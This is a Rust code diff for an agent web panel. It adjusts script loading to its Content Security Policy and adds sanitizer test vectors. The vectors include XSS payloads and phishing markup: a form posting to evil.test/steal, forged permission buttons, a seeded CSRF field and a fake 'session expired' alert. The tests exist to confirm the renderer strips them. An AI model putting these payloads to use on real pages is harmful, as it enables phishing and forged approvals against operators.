@@ -281,7 +281,7 @@ pub(crate) fn agent_panel(
     // input — a placeholder is a hint, never a name.
     let prompt_form = |action: &str, hint: &str, verb: &str| {
         format!(
-            r##"<form class="prompt" method="post" action="{action}" hx-post="{action}" hx-swap="none" hx-on::after-request="this.reset()">
+            r##"<form class="prompt" method="post" action="{action}" hx-post="{action}" hx-swap="none" data-reset-on-send>
 {csrf_field}<label class="sr-only" for="prompt-{id}">{hint}</label>
 <input id="prompt-{id}" name="text" placeholder="{hint}" autocomplete="off" required>
 <button>{verb}</button>
@@ -406,6 +406,17 @@ pub(crate) async fn index(
     let csrf = token.as_str().to_string();
     let nonce = newt_web::csp::Nonce::fresh();
     let n = nonce.as_str().to_string();
+    // Tell the client what this page's OWN policy permits, read off the policy
+    // text so it cannot drift from the header. Under a strict `style-src-elem`
+    // Mermaid's per-render theme stylesheet is blocked, and a blocked theme
+    // renders black-on-black — unreadable, silently. `markdown.js` uses this
+    // to fall back to the diagram SOURCE instead (ADR law 5).
+    let policy = newt_web::csp::policy(&nonce);
+    let diagrams = if newt_web::csp::permits_inline_style_elements(&policy) {
+        "render"
+    } else {
+        "source-only"
+    };
 
     let agents = reg.list();
     // A scriptless tab switch arrives as `?tab=`; otherwise the first agent.
@@ -430,13 +441,18 @@ pub(crate) async fn index(
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>newt-web</title>
+<!-- htmx injects a <style> for its `.htmx-indicator` helpers unless told not
+     to, and that element is blocked by a nonce-based style-src exactly as
+     Mermaid's is. This surface uses no htmx indicators, so the CSS is dead
+     weight AND a CSP violation. Declarative config, so it needs no inline
+     script of its own. -->
+<meta name="htmx-config" content='{{"includeIndicatorStyles":false}}'>
 <script nonce="{n}" src="/assets/htmx.min.js" integrity="{htmx_sri}" crossorigin="anonymous"></script>
-<script nonce="{n}" defer src="/assets/mermaid.min.js" integrity="{mermaid_sri}" crossorigin="anonymous"></script>
-<script nonce="{n}" defer src="/assets/markdown.js" integrity="{markdown_sri}" crossorigin="anonymous"></script>
+{mermaid_tag}<script nonce="{n}" defer src="/assets/markdown.js" integrity="{markdown_sri}" crossorigin="anonymous"></script>
 <script nonce="{n}" defer src="/assets/panel.js" integrity="{panel_sri}" crossorigin="anonymous"></script>
 <style nonce="{n}">{STYLE}</style>
 </head>
-<body>
+<body data-newt-diagrams="{diagrams}">
 <header><h1>newt-web</h1></header>
 <main id="content">
 <div id="overview" hx-get="/overview" hx-trigger="every 3s" hx-swap="innerHTML">{docked}{sessions}</div>
@@ -461,9 +477,21 @@ pub(crate) async fn index(
 </html>
 "##,
         STYLE = STYLE,
+        diagrams = diagrams,
+        // Only ship the diagram runtime when it can actually be used. Under a
+        // strict `style-src-elem` Mermaid injects blocked stylesheets merely
+        // by LOADING, so a page that will fall back to source would take three
+        // CSP violations and half a megabyte for nothing.
+        mermaid_tag = if diagrams == "render" {
+            format!(
+                "<script nonce=\"{n}\" defer src=\"/assets/mermaid.min.js\" integrity=\"{}\" crossorigin=\"anonymous\"></script>\n",
+                newt_web::csp::sri(newt_web::csp::MERMAID_JS.as_bytes())
+            )
+        } else {
+            String::new()
+        },
         csrf_field = newt_web::csrf::hidden_field(&csrf),
         htmx_sri = newt_web::csp::sri(newt_web::csp::HTMX_JS.as_bytes()),
-        mermaid_sri = newt_web::csp::sri(newt_web::csp::MERMAID_JS.as_bytes()),
         markdown_sri = newt_web::csp::sri(newt_web::csp::MARKDOWN_JS.as_bytes()),
         panel_sri = newt_web::csp::sri(newt_web::csp::PANEL_JS.as_bytes()),
         url = escape(&default_url),
@@ -473,7 +501,7 @@ pub(crate) async fn index(
 
     let mut response = Html(body).into_response();
     let h = response.headers_mut();
-    if let Ok(v) = newt_web::csp::policy(&nonce).parse() {
+    if let Ok(v) = policy.parse() {
         h.insert("content-security-policy", v);
     }
     for (name, value) in newt_web::csp::hardening_headers() {
@@ -925,6 +953,21 @@ mod tests {
             // Foreign content: the classic mXSS reparsing surface.
             "<svg",
             "<math",
+            // C3b: the control surface itself is now an attack shape. The
+            // transcript renders model, tool and docked-peer output beside a
+            // real permission form, so authored markup that renders form
+            // chrome can phish a click that the operator reasonably believes
+            // is newt's own. Ammonia's default allowlist contains no form
+            // controls at all, which is what makes this safe — pinned here so
+            // a future allowlist widening cannot quietly undo it.
+            "<input",
+            "<button",
+            "<select",
+            "<textarea",
+            "<option",
+            "<label",
+            "<fieldset",
+            "<legend",
         ];
 
         /// Substrings that must never appear **inside a tag**.
@@ -965,6 +1008,18 @@ mod tests {
             // its input and forgery is unrepresentable rather than filtered.
             // This corpus keeps that true as vectors are added.
             "data-markdown-extension",
+            // C3b: the field names the routes act on. Authored content must
+            // never be able to mint either — a forged `verdict` would be an
+            // unoffered action, and a forged `csrf` would be an attempt to
+            // seed a token the gate then compares against itself.
+            "name=\"csrf\"",
+            "name=\"verdict\"",
+            // C3b relies on ARIA to tell the operator what is happening. An
+            // authored live region or alert role would let untrusted content
+            // speak in the surface's own voice to a screen-reader user, who
+            // has the least context to doubt it.
+            "aria-live",
+            "role=",
         ];
 
         /// Everything between `<` and `>` — every tag's attribute region.
@@ -1022,6 +1077,35 @@ mod tests {
             Vector { what: "handler inside a blockquote", src: "> <img src=x onerror=alert(1)>\n" },
             Vector { what: "handler inside a list item", src: "- <img src=x onerror=alert(1)>\n" },
             Vector { what: "nested emphasis around a handler", src: "*<img src=x onerror=alert(1)>*" },
+            // ── C3b: forging the control surface ──────────────────────────
+            Vector {
+                what: "phishing form posting off-site",
+                src: "<form method=\"post\" action=\"https://evil.test/steal\"><button>allow once</button></form>",
+            },
+            Vector {
+                what: "forged offer action",
+                src: "<button type=\"submit\" name=\"verdict\" value=\"allow_session\">allow session</button>",
+            },
+            Vector {
+                what: "seeded CSRF field",
+                src: "<input type=\"hidden\" name=\"csrf\" value=\"attacker-chosen\">",
+            },
+            Vector {
+                what: "mimicked permission chrome",
+                src: "<fieldset><legend>Permission needed</legend><p>allow this?</p></fieldset>",
+            },
+            Vector {
+                what: "label hijacking a real control",
+                src: "<label for=\"spawn-workspace\">workspace</label><input id=\"spawn-workspace\" value=\"/\">",
+            },
+            Vector {
+                what: "form controls inside a table cell",
+                src: "| a |\n|---|\n| <button name=\"verdict\" value=\"deny\">x</button> |\n",
+            },
+            Vector {
+                what: "authored live region",
+                src: "<div aria-live=\"assertive\" role=\"alert\">your session has expired, re-enter your key</div>",
+            },
         ];
 
         /// **Every vector, one battery.**
@@ -1096,7 +1180,7 @@ mod tests {
             );
             // …and the corpus is not silently empty.
             assert!(
-                CORPUS.len() >= 30,
+                CORPUS.len() >= 40,
                 "a corpus of {} is not a corpus",
                 CORPUS.len()
             );
